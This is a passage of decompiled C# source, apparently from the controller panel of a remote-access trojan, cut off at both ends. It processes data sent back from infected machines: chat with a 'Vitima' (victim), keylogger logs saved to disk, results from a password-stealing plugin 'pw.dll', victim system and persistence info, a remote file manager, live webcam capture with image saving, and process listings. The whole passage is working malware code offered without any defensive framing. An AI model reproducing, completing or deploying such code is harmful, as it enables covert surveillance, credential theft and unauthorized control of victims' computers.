																						lock (obj5)
																						{
																							chat.T1.AppendText("Conectado...\r\n");
																						}
																					}
																					else
																					{
																						flag2 = (Operators.CompareString(left5, "@", false) != 0);
																						if (!flag2)
																						{
																							Chat obj6 = chat;
																							lock (obj6)
																							{
																								chat.T1.SelectionStart = chat.T1.TextLength;
																								chat.T1.SelectionFont = new Font(chat.T1.Font, FontStyle.Bold);
																								chat.T1.AppendText("[ Vitima ] ");
																								chat.T1.SelectionFont = chat.T1.Font;
																								chat.T1.AppendText(Class6.smethod_16(array2[3]) + "\r\n");
																								chat.T1.SelectionStart = chat.T1.TextLength;
																								chat.T1.ScrollToCaret();
																								try
																								{
																									Interaction.AppActivate(chat.Text);
																								}
																								catch (Exception ex10)
																								{
																								}
																							}
																						}
																					}
																				}
																			}
																		}
																		else
																		{
																			flag2 = (Operators.CompareString(left, "kla", false) == 0);
																			if (flag2)
																			{
																				kl kl = (kl)Class7.smethod_3("kl" + client.ip());
																				kl obj7 = kl;
																				lock (obj7)
																				{
																					kl.T1.Clear();
																					string[] array21 = Strings.Split(Class6.smethod_16(array2[1]), "\r\n", -1, CompareMethod.Binary);
																					kl.ProgressBar1.Value = 0;
																					kl.ProgressBar1.Maximum = array21.Length;
																					foreach (string t2 in array21)
																					{
																						kl.insert(t2);
																						ProgressBar progressBar3 = kl.ProgressBar1;
																						progressBar3.Value++;
																					}
																					kl.T1.ScrollToCaret();
																					kl.ProgressBar1.Value = 0;
																					kl.ToolStripMenuItem1.Enabled = true;
																					flag2 = !Directory.Exists(client.Folder);
																					if (flag2)
																					{
																						Directory.CreateDirectory(client.Folder);
																					}
																					kl.T1.SaveFile(client.Folder + "Keylogger.txt");
																				}
																			}
																			else
																			{
																				flag2 = (Operators.CompareString(left, "kl", false) == 0);
																				if (flag2)
																				{
																					flag = Class7.form1_0.InvokeRequired;
																					if (flag)
																					{
																						Class7.form1_0.Invoke(new Class7.Delegate0(Class7.smethod_5), new object[]
																						{
																							RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(object_0)))
																						});
																					}
																					else
																					{
																						flag2 = (Class7.smethod_3("kl" + client.ip()) == null);
																						if (flag2)
																						{
																							new kl
																							{
																								c = client,
																								Name = "kl" + client.ip(),
																								Text = Conversions.ToString(RuntimeHelpers.GetObjectValue(Class7.smethod_1(client.L)))
																							}.Show();
																						}
																						Thread thread = new Thread(new ParameterizedThreadStart(Class7.smethod_5));
																						Thread thread2 = thread;
																						object[] array23 = new object[2];
																						array23[0] = client;
																						object[] array24 = array23;
																						int num23 = 1;
																						string text4 = "kla" + Class7.string_1 + array2[1];
																						array24[num23] = Class6.smethod_11(ref text4);
																						thread2.Start(array23);
																					}
																				}
																				else
																				{
																					flag2 = (Operators.CompareString(left, "ret", false) == 0);
																					if (flag2)
																					{
																						flag = Class7.form1_0.InvokeRequired;
																						if (flag)
																						{
																							Class7.form1_0.Invoke(new Class7.Delegate0(Class7.smethod_5), new object[]
																							{
																								RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(object_0)))
																							});
																						}
																						else
																						{
																							flag2 = (Operators.CompareString(array2[1], Class7.smethod_0("pw.dll", null).string_1, false) != 0);
																							if (!flag2)
																							{
																								Pass pass = (Pass)Class7.smethod_3("Pass");
																								flag2 = (pass == null);
																								if (flag2)
																								{
																									pass = new Pass();
																									pass.Show();
																								}
																								Pass pass2 = pass;
																								Client client3 = client;
																								string text5 = Class6.smethod_16(array2[2]);
																								string text6 = text5;
																								pass2.XD(ref client3, ref text6);
																							}
																						}
																					}
																					else
																					{
																						flag2 = (Operators.CompareString(left, "inf", false) == 0);
																						if (flag2)
																						{
																							flag = (client.L == null);
																							if (!flag)
																							{
																								string[] array25 = Strings.Split(Class6.smethod_16(array2[1]), "\r\n", -1, CompareMethod.Binary);
																								string text7 = "+++ Server Info";
																								int num24 = 0;
																								int num25 = array25.Length - 1;
																								for (int num26 = num24; num26 <= num25; num26++)
																								{
																									text7 = string.Concat(new string[]
																									{
																										text7,
																										"\r\n{",
																										Conversions.ToString(num26),
																										"}  ",
																										array25[num26]
																									});
																								}
																								client.L.Cells[0].ToolTipText = string.Format(text7, new object[]
																								{
																									"Nome",
																									"DNS",
																									"Dir",
																									"Exe",
																									"Copy",
																									"StartUP F",
																									"StartUp R",
																									"BSOD"
																								});
																							}
																						}
																						else
																						{
																							flag2 = (Operators.CompareString(left, "FM", false) == 0);
																							if (flag2)
																							{
																								Manager manager8 = (Manager)Class7.smethod_3("m" + client.ip());
																								flag2 = (manager8 == null);
																								if (!flag2)
																								{
																									string left6 = array2[1];
																									flag2 = (Operators.CompareString(left6, "!", false) == 0);
																									if (flag2)
																									{
																										manager8.L1.Items.Clear();
																										int num27 = 0;
																										List<ListViewItem> list6 = new List<ListViewItem>();
																										int num28 = 2;
																										int num29 = array2.Length - 1;
																										for (int num30 = num28; num30 <= num29; num30++)
																										{
																											string[] array26 = Strings.Split(Class6.smethod_16(array2[num30]), "*", -1, CompareMethod.Binary);
																											DirectoryInfo directoryInfo = new DirectoryInfo(array26[0]);
																											ListViewItem listViewItem7 = new ListViewItem(directoryInfo.Name);
																											listViewItem7.ToolTipText = directoryInfo.FullName;
																											listViewItem7.SubItems.Add(array26[1]);
																											string left7 = array26[1];
																											flag2 = (Operators.CompareString(left7, DriveType.Fixed.ToString(), false) == 0);
																											if (flag2)
																											{
																												listViewItem7.ImageIndex = 1;
																											}
																											else
																											{
																												flag2 = (Operators.CompareString(left7, DriveType.Removable.ToString(), false) == 0);
																												if (flag2)
																												{
																													listViewItem7.ImageIndex = 3;
																												}
																												else
																												{
																													flag2 = (Operators.CompareString(left7, DriveType.CDRom.ToString(), false) == 0);
																													if (flag2)
																													{
																														listViewItem7.ImageIndex = 2;
																													}
																													else
																													{
																														flag2 = (Operators.CompareString(left7, string.Empty, false) == 0);
																														if (flag2)
																														{
																															listViewItem7.ImageIndex = 0;
																															switch (num27)
																															{
																															case 0:
																																listViewItem7.Text = "Area de Trabalho";
																																break;
																															case 1:
																																listViewItem7.Text = "Minhas Fotos";
																																break;
																															case 2:
																																listViewItem7.Text = "Usuario";
																																break;
																															case 3:
																																listViewItem7.Text = "MsConfig";
																																break;
																															}
																															num27++;
																															listViewItem7.SubItems[1].Text = "DIR";
																														}
																														else
																														{
																															listViewItem7.ImageIndex = ((Operators.CompareString(left7, DriveType.Network.ToString(), false) != 0) ? 1 : 5);
																														}
																													}
																												}
																											}
																											list6.Add(listViewItem7);
																											flag2 = (list6.Count > 10);
																											if (flag2)
																											{
																												manager8.L1.Items.AddRange(list6.ToArray());
																												list6.Clear();
																											}
																										}
																										flag2 = (list6.Count > 0);
																										if (flag2)
																										{
																											manager8.L1.Items.AddRange(list6.ToArray());
																											list6.Clear();
																										}
																										manager8.L1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
																									}
																									else
																									{
																										flag2 = (Operators.CompareString(left6, "@", false) == 0);
																										if (flag2)
																										{
																											ToolStripProgressBar pr4 = manager8.pr;
																											lock (pr4)
																											{
																												flag2 = manager8.Cache.Contains(Class6.smethod_16(array2[2]));
																												if (flag2)
																												{
																													manager8.Cache.Remove(Class6.smethod_16(array2[2]));
																												}
																												Manager.GClass14 gclass2 = new Manager.GClass14();
																												gclass2.string_0 = Class6.smethod_16(array2[2]);
																												manager8.Cache.Add(gclass2, gclass2.string_0, null, null);
																												DirectoryInfo directoryInfo2 = new DirectoryInfo(Class6.smethod_16(array2[2]));
																												flag2 = (Operators.CompareString(manager8.TextBox1.Text, directoryInfo2.FullName, false) != 0);
																												if (flag2)
																												{
																													gclass2.list_1.Clear();
																													gclass2.list_0.Clear();
																													try
																													{
																														manager8.Cache.Remove(Class6.smethod_16(array2[2]));
																													}
																													catch (Exception ex11)
																													{
																													}
																												}
																												else
																												{
																													manager8.pr.Value = 0;
																													string[] array27 = Strings.Split(array2[3], "*", -1, CompareMethod.Binary);
																													manager8.pr.Maximum = array27.Length - 1;
																													manager8.L2.Items.Clear();
																													flag2 = (directoryInfo2.Parent != null);
																													if (flag2)
																													{
																														ListViewItem listViewItem8 = manager8.L2.Items.Add("..", "..", 0);
																														listViewItem8.ToolTipText = directoryInfo2.Parent.FullName;
																														listViewItem8.SubItems.Add(string.Empty);
																														listViewItem8.SubItems.Add("DIR");
																													}
																													manager8.vmethod_108.Images.Clear();
																													manager8.vmethod_108.Images.Add(manager8.MG.Images[0]);
																													manager8.vmethod_108.Images.Add("*", manager8.MG.Images[4]);
																													List<ListViewItem> list7 = new List<ListViewItem>();
																													int num31 = 0;
																													int num32 = array27.Length - 2;
																													int num33 = num31;
																													while (num33 <= num32)
																													{
																														flag2 = (Operators.CompareString(manager8.TextBox1.Text, directoryInfo2.FullName, false) == 0);
																														if (flag2)
																														{
																															ListViewItem listViewItem9 = new ListViewItem(Class6.smethod_16(array27[num33]), 0);
																															ListViewItem listViewItem10 = listViewItem9;
																															listViewItem10.SubItems.Add(string.Empty);
																															listViewItem10.SubItems.Add("DIR");
																															listViewItem10.ToolTipText = directoryInfo2.FullName + listViewItem10.Text;
																															gclass2.list_0.Add(listViewItem10.ToolTipText);
																															ToolStripProgressBar pr5 = manager8.pr;
																															pr5.Value++;
																															list7.Add(listViewItem9);
																															flag2 = (list7.Count > 20);
																															if (flag2)
																															{
																																manager8.L2.Items.AddRange(list7.ToArray());
																																list7.Clear();
																															}
																															num33++;
																														}
																														else
																														{
																															gclass2.list_1.Clear();
																															gclass2.list_0.Clear();
																															try
																															{
																																manager8.Cache.Remove(Class6.smethod_16(array2[2]));
																																return;
																															}
																															catch (Exception ex12)
																															{
																																return;
																															}
																														}
																													}
																													flag2 = (list7.Count > 0);
																													if (flag2)
																													{
																														manager8.L2.Items.AddRange(list7.ToArray());
																														list7.Clear();
																													}
																													manager8.TextBox1.BackColor = Color.Gainsboro;
																													manager8.L2.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
																													client.Send(string.Concat(new string[]
																													{
																														"Ex",
																														Class7.string_1,
																														"fm",
																														Class7.string_1,
																														"@",
																														Class7.string_1,
																														array2[2]
																													}));
																													manager8.pr.Value = 0;
																												}
																											}
																										}
																										else
																										{
																											flag2 = (Operators.CompareString(left6, "#", false) == 0);
																											if (flag2)
																											{
																												ToolStripProgressBar pr6 = manager8.pr;
																												lock (pr6)
																												{
																													string text8 = Class6.smethod_16(array2[2]);
																													flag2 = (Operators.CompareString(manager8.TextBox1.Text, text8, false) != 0);
																													if (!flag2)
																													{
																														Manager.GClass14 gclass3 = (Manager.GClass14)manager8.Cache[Class6.smethod_16(array2[2])];
																														gclass3.list_1.Clear();
																														manager8.pr.Value = 0;
																														string[] array28 = Strings.Split(array2[3], "*", -1, CompareMethod.Binary);
																														manager8.pr.Maximum = array28.Length - 1;
																														List<ListViewItem> list8 = new List<ListViewItem>();
																														int num34 = 0;
																														int num35 = array28.Length - 2;
																														int num36 = num34;
																														while (num36 <= num35)
																														{
																															string[] array29 = Strings.Split(Class6.smethod_16(array28[num36]), "*", -1, CompareMethod.Binary);
																															flag2 = (Operators.CompareString(manager8.TextBox1.Text, text8, false) == 0);
																															if (flag2)
																															{
																																ListViewItem listViewItem11 = new ListViewItem(array29[0]);
																																ListViewItem listViewItem12 = listViewItem11;
																																FileInfo fileInfo = new FileInfo(text8 + array29[0]);
																																listViewItem12.ToolTipText = fileInfo.FullName;
																																listViewItem12.SubItems.Add(Class6.smethod_17(Conversions.ToLong(array29[1])));
																																listViewItem12.Name = listViewItem12.ToolTipText;
																																flag2 = (array29.Length == 2);
																																if (flag2)
																																{
																																	flag = (Operators.CompareString(fileInfo.Extension, string.Empty, false) == 0);
																																	if (flag)
																																	{
																																		listViewItem12.SubItems.Add(string.Empty);
																																		listViewItem12.ImageKey = "*";
																																	}
																																	else
																																	{
																																		listViewItem12.SubItems.Add(fileInfo.Extension.Replace(".", string.Empty));
																																		flag2 = !manager8.vmethod_108.Images.ContainsKey(fileInfo.Extension);
																																		if (flag2)
																																		{
																																			File.Create(Application.StartupPath + "\\!" + fileInfo.Extension).Close();
																																			manager8.vmethod_108.Images.Add(fileInfo.Extension, Icon.ExtractAssociatedIcon(Application.StartupPath + "\\!" + fileInfo.Extension));
																																			File.Delete(Application.StartupPath + "\\!" + fileInfo.Extension);
																																			listViewItem12.ImageKey = fileInfo.Extension;
																																		}
																																		else
																																		{
																																			listViewItem12.ImageKey = fileInfo.Extension;
																																		}
																																	}
																																}
																																else
																																{
																																	listViewItem12.SubItems.Add(fileInfo.Extension.Remove(0, 1));
																																	flag2 = !manager8.vmethod_108.Images.ContainsKey(listViewItem12.ToolTipText);
																																	if (flag2)
																																	{
																																		manager8.vmethod_108.Images.Add(listViewItem12.ToolTipText, Image.FromStream(new MemoryStream(Convert.FromBase64String(array29[2]))));
																																	}
																																	flag2 = !manager8.Images.Contains("!" + listViewItem12.ToolTipText);
																																	if (flag2)
																																	{
																																		manager8.Images.Add(manager8.vmethod_108.Images[listViewItem12.ToolTipText], "!" + listViewItem12.ToolTipText, null, null);
																																	}
																																	listViewItem12.ImageKey = listViewItem12.ToolTipText;
																																}
																																gclass3.list_1.Add(string.Concat(new string[]
																																{
																																	listViewItem12.ToolTipText,
																																	"*",
																																	listViewItem12.SubItems[1].Text,
																																	"*",
																																	listViewItem12.SubItems[2].Text
																																}));
																																ToolStripProgressBar pr7 = manager8.pr;
																																pr7.Value++;
																																list8.Add(listViewItem11);
																																flag2 = (list8.Count > 20);
																																if (flag2)
																																{
																																	manager8.L2.Items.AddRange(list8.ToArray());
																																	list8.Clear();
																																}
																																num36++;
																															}
																															else
																															{
																																gclass3.list_1.Clear();
																																gclass3.list_0.Clear();
																																try
																																{
																																	manager8.Cache.Remove(Class6.smethod_16(array2[2]));
																																	return;
																																}
																																catch (Exception ex13)
																																{
																																	return;
																																}
																															}
																														}
																														flag2 = (list8.Count > 0);
																														if (flag2)
																														{
																															manager8.L2.Items.AddRange(list8.ToArray());
																															list8.Clear();
																														}
																														manager8.TextBox1.BackColor = Color.WhiteSmoke;
																														manager8.L2.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
																														manager8.pr.Value = 0;
																													}
																												}
																											}
																											else
																											{
																												flag2 = (Operators.CompareString(left6, "$", false) == 0);
																												if (flag2)
																												{
																													flag = manager8.Images.Contains(Class6.smethod_16(array2[2]));
																													if (flag)
																													{
																														manager8.Images.Remove(Class6.smethod_16(array2[2]));
																													}
																													manager8.Images.Add(Image.FromStream(new MemoryStream((byte[])NewLateBinding.LateIndexGet(Class6.smethod_9(array, array2[2] + Class7.string_1), new object[]
																													{
																														RuntimeHelpers.GetObjectValue(1)
																													}, null))), Class6.smethod_16(array2[2]), null, null);
																													flag2 = (!manager8.L2.Items.ContainsKey(Class6.smethod_16(array2[2])) || !manager8.L2.Items[Class6.smethod_16(array2[2])].Selected);
																													if (!flag2)
																													{
																														manager8.p.Image = (Image)manager8.Images[Class6.smethod_16(array2[2])];
																														manager8.p.Visible = true;
																													}
																												}
																												else
																												{
																													flag2 = (Operators.CompareString(left6, "%", false) == 0);
																													if (flag2)
																													{
																														flag = Class7.form1_0.InvokeRequired;
																														if (flag)
																														{
																															Class7.form1_0.Invoke(new Class7.Delegate0(Class7.smethod_5), new object[]
																															{
																																RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(object_0)))
																															});
																														}
																														else
																														{
																															Note note = new Note();
																															note.FN = Class6.smethod_16(array2[2]);
																															note.Text = manager8.Text + " - " + note.FN;
																															note.SK = manager8.sk;
																															note.TextBox1.Text = Class6.smethod_16(array2[3]).Replace("\0", string.Empty);
																															note.Show();
																															note.ToolStripMenuItem1.Enabled = false;
																														}
																													}
																													else
																													{
																														flag2 = (Operators.CompareString(left6, "dl", false) == 0);
																														if (flag2)
																														{
																															string[] array30 = Strings.Split(Class6.smethod_16(array2[2]), "*", -1, CompareMethod.Binary);
																															try
																															{
																																try
																																{
																																	foreach (object obj8 in manager8.L2.Items)
																																	{
																																		ListViewItem listViewItem13 = (ListViewItem)obj8;
																																		flag2 = (Operators.CompareString(array30[1], "!", false) == 0);
																																		if (flag2)
																																		{
																																			flag = (Operators.CompareString(listViewItem13.Text, new DirectoryInfo(array30[0]).Name, false) == 0 & Operators.CompareString(listViewItem13.SubItems[2].Text, "DIR", false) == 0);
																																			if (flag)
																																			{
																																				listViewItem13.Remove();
																																				break;
																																			}
																																		}
																																		else
																																		{
																																			flag2 = (Operators.CompareString(listViewItem13.Text, new DirectoryInfo(array30[0]).Name, false) == 0 & Operators.CompareString(listViewItem13.SubItems[2].Text, "DIR", false) != 0);
																																			if (flag2)
																																			{
																																				listViewItem13.Remove();
																																				break;
																																			}
																																		}
																																	}
																																}
																																finally
																																{
																																	IEnumerator enumerator7;
																																	flag2 = (enumerator7 is IDisposable);
																																	if (flag2)
																																	{
																																		(enumerator7 as IDisposable).Dispose();
																																	}
																																}
																															}
																															finally
																															{
																																IEnumerator enumerator8;
																																flag2 = (enumerator8 is IDisposable);
																																if (flag2)
																																{
																																	(enumerator8 as IDisposable).Dispose();
																																}
																															}
																														}
																														else
																														{
																															flag2 = (Operators.CompareString(left6, "nm", false) == 0);
																															if (flag2)
																															{
																																string[] array31 = Strings.Split(Class6.smethod_16(array2[2]), "*", -1, CompareMethod.Binary);
																																try
																																{
																																	try
																																	{
																																		foreach (object obj9 in manager8.L2.Items)
																																		{
																																			ListViewItem listViewItem14 = (ListViewItem)obj9;
																																			flag2 = (Operators.CompareString(listViewItem14.ToolTipText, array31[0], false) == 0);
																																			if (flag2)
																																			{
																																				flag = (Operators.CompareString(array31[2], "*", false) == 0);
																																				if (flag)
																																				{
																																					DirectoryInfo directoryInfo3 = new DirectoryInfo(array31[0]);
																																					listViewItem14.Text = array31[1];
																																					listViewItem14.ToolTipText = directoryInfo3.Parent.FullName + "\\" + listViewItem14.Text;
																																				}
																																				else
																																				{
																																					FileInfo fileInfo2 = new FileInfo(array31[0]);
																																					listViewItem14.Text = array31[1];
																																					listViewItem14.ToolTipText = fileInfo2.Directory.FullName + "\\" + listViewItem14.Text;
																																					listViewItem14.SubItems[2].Text = new FileInfo(listViewItem14.ToolTipText).Extension.Replace(".", string.Empty);
																																				}
																																			}
																																		}
																																	}
																																	finally
																																	{
																																		IEnumerator enumerator9;
																																		flag2 = (enumerator9 is IDisposable);
																																		if (flag2)
																																		{
																																			(enumerator9 as IDisposable).Dispose();
																																		}
																																	}
																																}
																																finally
																																{
																																	IEnumerator enumerator10;
																																	flag2 = (enumerator10 is IDisposable);
																																	if (flag2)
																																	{
																																		(enumerator10 as IDisposable).Dispose();
																																	}
																																}
																															}
																															else
																															{
																																flag2 = (Operators.CompareString(left6, "ER", false) != 0);
																																if (!flag2)
																																{
																																	manager8.SL.Text = array2[3];
																																	flag2 = !array2[3].StartsWith("UnRAR_");
																																	if (!flag2)
																																	{
																																		ToolStripProgressBar pr8 = manager8.pr;
																																		lock (pr8)
																																		{
																																			FileInfo fileInfo3 = new FileInfo(array2[3]);
																																			flag2 = (Operators.CompareString(fileInfo3.Directory.FullName.ToLower() + "\\", manager8.TextBox1.Text.ToLower(), false) != 0);
																																			if (!flag2)
																																			{
																																				ListViewItem listViewItem15 = manager8.L2.Items.Add(fileInfo3.FullName, fileInfo3.Name, 0);
																																				listViewItem15.SubItems.Add(string.Empty);
																																				listViewItem15.SubItems.Add("DIR");
																																			}
																																		}
																																	}
																																}
																															}
																														}
																													}
																												}
																											}
																										}
																									}
																								}
																							}
																							else
																							{
																								flag2 = (Operators.CompareString(left, "CAM", false) == 0);
																								if (flag2)
																								{
																									flag = (client.osk == null);
																									if (flag)
																									{
																										client.isPL = true;
																										try
																										{
																											client.osk = Class7.sk_0.GetClient(array2[1]);
																										}
																										catch (Exception ex14)
																										{
																											client.CN = false;
																										}
																									}
																									Cam cam = (Cam)Class7.smethod_3("cam" + client.ip());
																									string left8 = array2[2];
																									flag2 = (Operators.CompareString(left8, "~", false) == 0);
																									if (flag2)
																									{
																										flag = (cam == null);
																										if (flag)
																										{
																											bool flag5 = Class7.form1_0.InvokeRequired;
																											if (flag5)
																											{
																												Class7.form1_0.Invoke(new Class7.Delegate0(Class7.smethod_5), new object[]
																												{
																													RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(object_0)))
																												});
																											}
																											else
																											{
																												Cam cam2 = new Cam();
																												cam2.sk = client;
																												cam2.osk = client.osk;
																												cam2.Name = "cam" + client.ip();
																												int num37 = 3;
																												int num38 = array2.Length - 1;
																												for (int num39 = num37; num39 <= num38; num39++)
																												{
																													cam2.ComboBox1.SelectedIndex = cam2.ComboBox1.Items.Add(array2[num39]);
																												}
																												cam2.Show();
																											}
																										}
																										else
																										{
																											int num40 = 3;
																											int num41 = array2.Length - 1;
																											for (int num42 = num40; num42 <= num41; num42++)
																											{
																												cam.ComboBox1.SelectedIndex = cam.ComboBox1.Items.Add(array2[num42]);
																											}
																										}
																									}
																									else
																									{
																										bool flag5 = Operators.CompareString(left8, "!", false) == 0;
																										if (flag5)
																										{
																											flag2 = (cam == null);
																											if (!flag2)
																											{
																												Cam cam3 = cam;
																												cam3.fps++;
																												cam.pkt = array.Length;
																												Thread.Sleep(10);
																												flag5 = (array2[3].Length == 1);
																												if (!flag5)
																												{
																													Image image = Image.FromStream(new MemoryStream((byte[])NewLateBinding.LateIndexGet(Class6.smethod_9(array, array2[2] + Class7.string_1), new object[]
																													{
																														RuntimeHelpers.GetObjectValue(1)
																													}, null)));
																													flag5 = cam.CheckBox3.Checked;
																													if (flag5)
																													{
																														try
																														{
																															image.Save(cam.folder + DateAndTime.Now.ToString("yyMMddhhmmssfff") + ".jpg");
																														}
																														catch (Exception ex15)
																														{
																														}
																													}
																													cam.PictureBox1.Image = image;
																												}
																											}
																										}
																										else
																										{
																											flag5 = (Operators.CompareString(left8, "@", false) != 0 || cam == null);
																											if (!flag5)
																											{
																												cam.Button1.Text = "Start";
																											}
																										}
																									}
																								}
																								else
																								{
																									bool flag5 = Operators.CompareString(left, "proc", false) == 0;
																									if (flag5)
																									{
																										Manager manager9 = (Manager)Class7.smethod_3("m" + client.ip());
																										flag5 = (manager9 == null);
																										if (!flag5)
																										{
																											ToolStripProgressBar pr9 = manager9.pr;
																											lock (pr9)
																											{
																												string left9 = array2[1];
																												flag5 = (Operators.CompareString(left9, "pid", false) == 0);
																												if (flag5)
																												{
																													manager9.PID = Conversions.ToInteger(array2[2]);
																												}
																												else
																												{
																													flag5 = (Operators.CompareString(left9, "!", false) == 0);
																													if (flag5)
																													{
																														Manager obj10 = manager9;
																														lock (obj10)
																														{
																															string[] array32 = Strings.Split(array2[2], "[::]", -1, CompareMethod.Binary);
																															bool flag6;
																															flag5 = !Class7.InlineAssignHelper<bool>(ref flag6, manager9.LPR.Items.Count == 0);
																															if (flag5)
																															{
																																try
																																{
																																	try
																																	{
																																		foreach (object obj11 in manager9.LPR.Items)
																																		{
																																			ListViewItem listViewItem16 = (ListViewItem)obj11;
																																			flag2 = (listViewItem16.ForeColor == Color.GreenYellow);
																																			if (flag2)
																																			{
																																				try
																																				{
																																					try
																																					{
																																						foreach (object obj12 in listViewItem16.SubItems)
																																						{
																																							ListViewItem.ListViewSubItem listViewSubItem = (ListViewItem.ListViewSubItem)obj12;
																																							listViewSubItem.ForeColor = manager9.LPR.ForeColor;
																																						}
																																					}
																																					finally
																																					{
																																						IEnumerator enumerator12;
																																						flag5 = (enumerator12 is IDisposable);
																																						if (flag5)
																																						{
																																							(enumerator12 as IDisposable).Dispose();
																																						}
																																					}
																																				}
																																				finally
																																				{
																																					IEnumerator enumerator13;
																																					flag5 = (enumerator13 is IDisposable);
																																					if (flag5)
																																					{
																																						(enumerator13 as IDisposable).Dispose();
																																					}
																																				}
																																			}
																																		}
																																	}
																																	finally
																																	{
																																		IEnumerator enumerator11;
																																		flag5 = (enumerator11 is IDisposable);
																																		if (flag5)
																																		{
																																			(enumerator11 as IDisposable).Dispose();
																																		}
																																	}
																																}
																																finally
																																{
																																	IEnumerator enumerator14;
																																	flag5 = (enumerator14 is IDisposable);
																																	if (flag5)
																																	{
																																		(enumerator14 as IDisposable).Dispose();
																																	}
																																}
																															}
																															flag5 = (array32.Length > 1);
																															if (flag5)
																															{
																																manager9.pr.Value = 0;
																																manager9.pr.Maximum = array32.Length;
																																List<ListViewItem> list9 = new List<ListViewItem>();
																																foreach (string text9 in array32)
																																{
																																	string[] array34 = Strings.Split(text9, "[:]", -1, CompareMethod.Binary);
																																	flag5 = (Operators.CompareString(text9, string.Empty, false) != 0);
																																	if (!flag5)
																																	{
																																		break;
																																	}
																																	flag2 = array34[2].StartsWith("\\??\\");
																																	if (flag2)
																																	{
																																		array34[2] = array34[2].Remove(0, "\\??\\".Length);
																																	}
																																	try
																																	{
																																		ToolStripProgressBar pr10 = manager9.pr;
																																		pr10.Value++;
																																	}
																																	catch (Exception ex16)
																																	{
																																	}
																																	ListViewItem listViewItem17 = new ListViewItem(array34[0]);
																																	listViewItem17.SubItems.Add(array34[1]);
																																	listViewItem17.Name = array34[1];
																																	flag5 = array34[2].Contains(":\\");
																																	if (flag5)
																																	{
																																		listViewItem17.SubItems.Add(new FileInfo(array34[2].Replace("\"", string.Empty)).Directory.Name);
																																		listViewItem17.ToolTipText = array34[2].Replace("\"", string.Empty);
																																	}
																																	else
																																	{
																																		listViewItem17.SubItems.Add(string.Empty);
																																	}
																																	string text10 = " ";
																																	listViewItem17.SubItems.Add(array34[3]);
																																	flag5 = array34[4].StartsWith("\"");
																																	if (flag5)
																																	{
																																		text10 = "\"";
																																		array34[4] = array34[4].Remove(0, 1);
																																	}
																																	flag5 = array34[4].Contains(text10);
																																	if (flag5)
																																	{
																																		array34[4] = array34[4].Remove(0, Strings.InStr(array34[4], text10, CompareMethod.Binary));
																																		flag5 = array34[4].StartsWith(" ");
																																		if (flag5)
																																		{
																																			array34[4] = array34[4].Remove(0, 1);
																																		}
																																		listViewItem17.SubItems.Add(array34[4]);
																																	}
																																	else
																																	{
																																		listViewItem17.SubItems.Add(string.Empty);
																																	}
																																	flag5 = !flag6;
																																	if (flag5)
																																	{
																																		listViewItem17.ForeColor = Color.GreenYellow;
																																	}
																																	flag5 = (Conversions.ToInteger(array34[1]) == manager9.PID);
																																	if (flag5)
																																	{
																																		listViewItem17.ForeColor = Color.Red;
																																	}
																																	list9.Add(listViewItem17);
																																	flag5 = (list9.Count > 10);
																																	if (flag5)
																																	{
																																		manager9.LPR.Items.AddRange(list9.ToArray());
																																		list9.Clear();
																																	}
																																}
																																flag5 = (list9.Count > 0);
																																if (flag5)
																																{
																																	manager9.LPR.Items.AddRange(list9.ToArray());
																																	list9.Clear();
																																}
																																flag5 = manager9.PRFX;
																																if (flag5)
																																{
																																	manager9.PRFX = false;
																																	manager9.LPR.method_3();
																																}
																																ColumnHeader columnHeader_3 = manager9.LPR.columnHeader_0;
																																flag5 = (columnHeader_3 == null);
																																if (flag5)
																																{
																																	manager9.LPR.GClass9_ColumnClick(manager9.LPR, new ColumnClickEventArgs(0));
																																}
																																else
																																{
																																	columnHeader_3.Tag = RuntimeHelpers.GetObjectValue((!Operators.ConditionalCompareObjectEqual(RuntimeHelpers.GetObjectValue(columnHeader_3.Tag), "+", false)) ? ((!Operators.ConditionalCompareObjectEqual(RuntimeHelpers.GetObjectValue(columnHeader_3.Tag), "-", false)) ? "-" : "+") : "-");
																																	manager9.LPR.GClass9_ColumnClick(manager9.LPR, new ColumnClickEventArgs(columnHeader_3.Index));
																																}
																															}
																															manager9.PRNXT = true;
																														}
																													}
																													else
																													{
																														flag5 = (Operators.CompareString(left9, "RM", false) == 0);
																														if (flag5)
																														{
																															int num44 = 2;
																															int num45 = array2.Length - 1;
																															for (int num46 = num44; num46 <= num45; num46++)
																															{
																																manager9.LPR.Items.RemoveByKey(array2[num46]);
																															}
																														}
																														else
																														{
																															flag5 = (Operators.CompareString(left9, "ER", false) != 0);
																															if (!flag5)
																															{
																																manager9.SL.Text = array2[2];
																															}
																														}
																													}
																												}
																											}
																										}
																									}
																									else
																									{
																										flag5 = (Operators.CompareString(left, "lv", false) != 0);
																										bool flag7;
																										if (flag5)
																										{
																											flag2 = (Operators.CompareString(left, "ll", false) != 0);
																											if (flag2)
																											{
																												flag = (Operators.CompareString(left, "P", false) == 0);
																												if (flag)
																												{
																													flag7 = (client.L == null || client.L.Cells.Count <= Class7.int_10);
																													if (flag7)
																													{
																														return;
																													}
																													Collection online = Class7.form1_0.S.Online;
																													lock (online)
																													{
																														DataGridViewCell dataGridViewCell = client.L.Cells[Class7.int_10];
																														int num47 = Conversions.ToInteger(array2[1]);
																														dataGridViewCell.Style.ForeColor = ((num47 != 999) ? ((num47 < 500) ? ((num47 < 250) ? Color.LimeGreen : Color.LightGreen) : Color.GreenYellow) : Color.Orange);
																														client.L.Cells[Class7.int_10].Value = array2[1] + "ms";
																														return;
																													}
																												}
																												flag7 = (Operators.CompareString(left, "bla", false) == 0);
																												if (flag7)
																												{
																													client.L.DefaultCellStyle.ForeColor = Class7.form1_0.L1.DefaultCellStyle.ForeColor;
																													return;
																												}
																												flag7 = (Operators.CompareString(left, "~", false) == 0);
																												if (flag7)
																												{
																													client.Send("~");
																													return;
																												}
																												flag7 = (Operators.CompareString(left, "MSG", false) == 0);
																												if (flag7)
																												{
																													flag5 = !Class7.class8_0.bool_5;
																													if (flag5)
																													{
																														return;
																													}
																													Class7.form1_0.Pp1.WRT(new object[]
																													{
																														RuntimeHelpers.GetObjectValue(Color.LightSteelBlue),
																														Class6.smethod_13(),
